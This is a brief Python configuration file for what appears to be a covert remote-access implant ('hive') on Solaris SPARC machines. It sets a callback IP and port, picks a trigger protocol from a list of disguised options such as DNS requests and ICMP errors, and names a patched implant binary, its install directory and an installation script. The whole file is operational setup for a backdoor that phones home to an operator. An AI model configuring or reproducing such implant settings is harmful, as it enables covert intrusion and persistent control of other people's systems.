#!/usr/bin/python
# Filename: hiveSolarisConfiguration.py

callbackIP = "10.3.2.19"
#callbackPort must be in the 1-65535 range
callbackPort = "8000"
#triggerProtocol = [dns-request, icmp-error, ping-request, ping-reply, raw-tcp, raw-udp, tftp-wrq]
triggerProtocol = "dns-request"
#if triggerProtocol == "raw-udp" or "raw-tcp", remotePort must be in the 1-65535 range
remotePort = 0

oldImplantName = "hived-solaris-sparc-PATCHED"
newImplantName = "hived-solaris-sparc-PATCHED"
implantDirectory = "/export/home/"
installationScript = "install_Solaris_script"

# End of hiveSolarisConfiguration.py
